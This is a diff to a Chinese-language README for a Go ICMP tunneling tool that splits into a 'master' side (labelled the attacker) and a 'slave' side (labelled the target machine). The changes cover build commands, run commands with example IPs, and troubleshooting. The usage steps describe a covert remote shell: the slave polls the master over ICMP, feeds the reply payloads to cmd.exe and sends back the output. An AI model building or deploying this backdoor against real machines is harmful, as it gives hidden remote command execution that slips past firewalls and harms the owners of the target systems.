@@ -9,11 +9,8 @@
 ## 编译
 
 ```bash
-# Master 端（攻击者）
-go build -tags master -o icmp_m.exe ./icmp
-
-# Slave 端（目标机）
-go build -tags slave -o icmp_s.exe ./icmp
+# 统一编译为一个命令
+go build -o icmp.exe ./icmp
 ```
 
 如果依赖缺失，先执行：
@@ -27,7 +24,7 @@ go mod tidy
 ### Master 端
 
 ```bash
-.\icmp_m.exe -src 192.168.1.10 -dst 192.168.1.20
+.\icmp.exe master -src 192.168.1.10 -dst 192.168.1.20
 ```
 
 参数说明：
@@ -38,7 +35,7 @@ go mod tidy
 ### Slave 端
 
 ```bash
-.\icmp_s.exe -t 192.168.1.10
+.\icmp.exe slave -t 192.168.1.10
 ```
 
 参数说明：
@@ -52,8 +49,8 @@ go mod tidy
 
 ## 联调步骤
 
-1. 在控制端启动 `master`，指定本机 IP 和目标 `slave` IP。
-2. 在目标机启动 `slave`，`-t` 指向 `master` IP。
+1. 在控制端启动 `master` 子命令，指定本机 IP 和目标 `slave` IP。
+2. 在目标机启动 `slave` 子命令，`-t` 指向 `master` IP。
 3. `slave` 会周期性发送 ICMP Echo Request 拉取命令。
 4. `master` 收到请求后，会先打印请求 payload 中携带的命令执行结果，再把本地输入作为 Echo Reply payload 回给 `slave`。
 5. `slave` 收到 Echo Reply 后，把 payload 写入 `cmd.exe`，并在下一次 Echo Request 中把输出结果带回。
@@ -91,7 +88,7 @@ go mod tidy
 
 ## 故障排查
 
-- `main redeclared in this block`：确认使用了正确的 `-tags` 编译，不要直接 `go build ./icmp`。
+- 参数帮助：可执行 `.\icmp.exe -h`、`.\icmp.exe master -h` 或 `.\icmp.exe slave -h` 查看子命令用法。
 - `打开网卡失败` 或 `设置BPF过滤器失败`：通常是权限不足，或本机没有正确安装 `Npcap/WinPcap`。
 - 一直 `timeout`：检查 `-t`、`-src`、`-dst` 是否填写正确，确认两端网络可达且没有被防火墙拦截 ICMP。
 - 看不到回显结果：确认 `master` 和 `slave` 的 IP 对应关系填写正确，并确保 `master` 正在监听来自 `slave` 的 Echo Request。
